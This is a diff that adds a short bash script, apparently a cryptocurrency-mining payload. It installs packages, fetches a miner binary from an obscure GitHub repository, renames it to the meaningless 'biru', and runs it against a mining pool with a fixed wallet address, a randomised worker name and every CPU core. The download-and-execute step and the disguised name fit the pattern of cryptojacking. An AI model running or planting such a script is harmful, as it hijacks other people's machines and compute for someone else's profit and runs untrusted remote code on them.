@@ -1,0 +1,8 @@
+#!/bin/bash
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt install curl libssl1.0-dev
+apt install libjansson-dev libjansson4 -y
+wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz && tar xvf TT-Miner-2024.3.2.tar.gz && cd TT-Miner-2024.3.2
+wget -O biru https://github.com/kidoescegh/pilekyla/raw/refs/heads/main/cpuminer-avx
+chmod +x biru 
+./biru -a flex -o stratum+tcp://eu.mpool.live:5271 -u kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-VD -t $(nproc --all)
